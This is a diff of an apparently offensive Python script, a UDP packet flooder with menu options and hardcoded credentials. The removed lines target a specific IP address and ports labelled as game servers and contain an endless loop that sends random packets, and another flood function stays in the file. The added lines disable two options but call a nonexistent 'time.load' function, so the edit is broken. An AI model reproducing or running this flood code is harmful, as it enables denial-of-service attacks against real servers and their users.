@@ -59,82 +59,13 @@ if choice=="yes" or choice=="y":
     print("\033[31m━━━ Min Threads 110")
     threads = int(input("┗━>\033[0m:"))
   elif opt==1:
-    hellhfgh="TDR"
-    boyusfs="BIGB"
-    print("\033[31m━━━ Enter username")
-    user = input("┗━>\033[0m:")
-    print("\033[31m━━━ Enter password")
-    pswd = input("┗━>:")
-    if user ==hell and pswd==boy:
-      print("\033[31m━━━ Login succesfull")
-      time.sleep(1)
-      print("\033[31m━━━ Loading....10%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading......20%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading.......50%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading........86%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading.........100%")
-      ip="103.166.228.31"
-      port=7777
-      print("\033[32m━━━ Pakets")	
-      print("\033[32m━━━ Min Pakets 100")
-      times = int(input("┗━>\033[0m:"))
-      time.sleep(1)
-      print("\033[31m━━━ Threads")
-      print("\033[31m━━━ Min Threads 110")
-      threads = int(input("┗━>\033[0m:"))
-    else:
-      print("\033[31m━━━ Incorrect username or password")
+    print("SORRY, CURRENTLY THIS OPTION IS DISABLED DUE TO SOME ISSUES")
+    time.load(1)
+    print("CHOOSE OPTION 3")
   elif opt==2:
-    hell000 = "TDR"
-    boyjnj="BIGB"
-    print("\033[31m━━━ Enter username")
-    user = input("┗━>\033[0m:")
-    print("\033[31m━━━ Enter password")
-    pswd = input("┗━>:")
-    if user==hell and pswd==boy:
-      print("\033[31m━━━ Login succesfull")
-      time.sleep(1)
-      print("\033[31m━━━ Loading....10%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading......20%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading.......50%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading........86%")
-      time.sleep(1)
-      print("\033[31m━━━ Loading.........100%")
-      ip="103.166.228.31"
-      port=7775
-      print("\033[32m━━━ Pakets")	
-      print("\033[32m━━━ Min Pakets 100")
-      times = int(input("┗━>\033[0m:"))
-      time.sleep(1)
-      print("\033[31m━━━ Threads")
-      print("\033[31m━━━ Min Threads 110")
-      threads = int(input("┗━>\033[0m:"))
-    else:
-      print("\033[31m━━━ Incorrect username or password")
-  def xxxx():
-    data = random._urandom(998)
-    i = random.choice(("[•]","[•]","[•]"))
-    while True:
-      try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        addr = (str(ip),int(port))
-        for x in range(times):
-          s.sendto(data,addr)
-          if ip=="103.166.228.31"and port==7777:
-            print(i +" \033[32m=====> Attacking To Ngrp Server \033[0m%s:%s!!!"%(ip,port))
-          elif ip=="103.166.228.31"and port==7775:
-            print(i +" \033[32m=====> Attacking To Ngrp pointwar  Server \033[0m%s:%s!!!"%(ip,port))
-          else:
-            print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
-      except:
-        print("[!] Server Attack")
+    print("SORRY, CURRENTLY THIS OPTION IS DISABLED DUE TO SOME ISSUES")
+    time.load(1)
+    print("CHOOSE OPTION 3")
   def xxx():
     data = random._urandom(998)
     i = random.choice(("[•]","[•]","[•]"))
